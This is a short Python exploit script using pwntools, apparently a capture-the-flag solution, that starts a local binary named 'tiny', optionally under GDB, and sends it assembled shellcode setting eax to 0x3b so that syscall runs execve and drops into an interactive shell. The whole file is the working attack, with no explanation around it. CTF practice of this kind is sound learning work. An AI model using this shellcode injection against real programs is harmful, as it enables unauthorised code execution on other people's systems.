from pwn import *
from time import sleep

elf = ELF('./tiny')
context.arch = 'amd64'
context.terminal = ['konsole', '-e']

if 'GDB' in os.environ:
    print('DEBUG MODE')
    p = gdb.debug('./tiny', api=True, gdbscript='''
    # b *0x00401236
    c
    ''')
else:
    p = elf.process()

def stop(s='Waiting...'):
    if 'NOSTP' not in os.environ: input(s)
    else: sleep(1)

log.info(p.clean())

sh = '''
mov al, 0x0
shl eax
mov al, 0x3b
syscall
'''

p.sendline(asm(sh))

p.interactive()